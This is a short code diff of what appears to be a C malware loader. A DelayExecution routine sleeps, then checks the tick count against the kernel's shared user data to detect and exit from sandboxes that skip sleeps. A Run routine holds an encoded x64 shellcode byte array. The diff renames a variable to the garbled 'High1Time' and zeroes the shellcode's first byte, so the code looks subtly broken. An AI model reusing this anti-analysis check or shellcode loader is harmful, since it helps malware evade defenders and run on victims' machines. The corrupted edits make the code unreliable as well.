@@ -17,11 +17,11 @@ void DelayExecution()
 	Sleep(100000); // 100 seconds
 	
 	ULONG* PUserSharedData_TickCountMultiplier = (PULONG)SHARED_DATA_MULTIPLIER;
-	LONG* PUserSharedData_HighPart = (PLONG)SHARED_DATA_HIGHPART;
+	LONG* PUserSharedData_High1Time = (PLONG)SHARED_DATA_HIGHPART;
 	ULONG* PUserSharedData_LowPart = (PULONG)SHARED_DATA_LOWPART;
 	DWORD time = GetTickCount64();
 	
-	DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_HighPart << 8) +
+	DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
 		((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
 	
 	if ((time - kernelTime) > 100 && (kernelTime - time) > 100) exit(0);
@@ -30,7 +30,7 @@ void DelayExecution()
 void Run()
 {
 	unsigned char code[] =
-		"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
+		"\x00\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
 		"\xff\xff\xff\x48\xbb\x39\x06\x6e\x61\x42\x3c\x3a\xdc\x48"
 		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xc5\x4e\xed"
 		"\x85\xb2\xd4\xf6\xdc\x39\x06\x2f\x30\x03\x6c\x68\x8d\x6f"
